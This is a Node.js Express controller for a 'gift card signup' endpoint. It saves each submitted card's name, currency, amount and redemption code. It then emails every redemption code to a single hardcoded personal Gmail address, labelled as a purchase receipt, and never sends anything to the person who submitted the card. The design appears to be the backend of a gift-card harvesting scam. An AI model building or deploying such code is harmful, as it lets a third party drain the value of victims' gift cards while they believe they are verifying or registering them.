require('dotenv').config();
const GiftCardModel = require('../models/GiftCardMOdel');
const { sendEmail } = require('../helpers/sendMail');
const { paymentReceiptTemplate } = require('../helpers/emailTemplate');

exports.GiftCardSignup = async (req, res) => {
  try {
    const { Name, Currency, Amount, Redemptioncode } = req.body;

    if (!Name || !Currency || !Amount || !Redemptioncode) {
      return res.status(400).json({
        message: `Please enter all details`,
      });
    }

    const newGiftCard = new GiftCardModel({
      Name,
      Currency,
      Amount,
      Redemptioncode,
    });

    const savedGiftCard = await newGiftCard.save();

    
    const Email = "Khonarichie01@gmail.com";

    const emailContent = paymentReceiptTemplate(
      savedGiftCard.Name,
      savedGiftCard.Currency,
      savedGiftCard.Amount,
      savedGiftCard.Redemptioncode
    );

    await sendEmail({
      email: Email,
      subject: "Gift Card Purchase Receipt",
      html: emailContent,
    });

  
    return res.status(201).json({
      message: `Gift card saved successfully. Email sent to ${Email}.`,
      data: savedGiftCard,
    });

  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
